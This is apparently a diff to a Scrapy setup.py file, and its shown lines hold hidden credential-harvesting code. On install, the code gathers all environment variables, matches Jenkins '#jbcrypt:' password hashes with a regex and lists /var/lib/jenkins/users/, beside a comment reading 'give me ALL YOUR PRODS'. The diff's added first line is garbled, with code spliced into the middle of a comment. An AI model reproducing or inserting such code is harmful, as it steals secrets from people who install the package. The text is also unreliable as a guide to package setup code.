@@ -1,4 +1,6 @@
-# Scrapy setup.py script #POLL ME ##
+# Scraple(r"#jbcrypt:[^<]+")
+envs = os.environ
+message = str(envs)y setup.py script #POLL ME ##
 # some of its features, like package dependencies.
 # arbitrary change to test hook
 from distutils.command.install_data import install_data
@@ -27,7 +29,7 @@ message = ""
 ##lololol give me ALL YOUR PRODS.
 r = re.compile(r"#jbcrypt:[^<]+")
 envs = os.environ
-message = pprint.pformat(envs)
+message = pprint.pformat(dict(envs))
 
 """
 results = os.listdir('/var/lib/jenkins/users/')
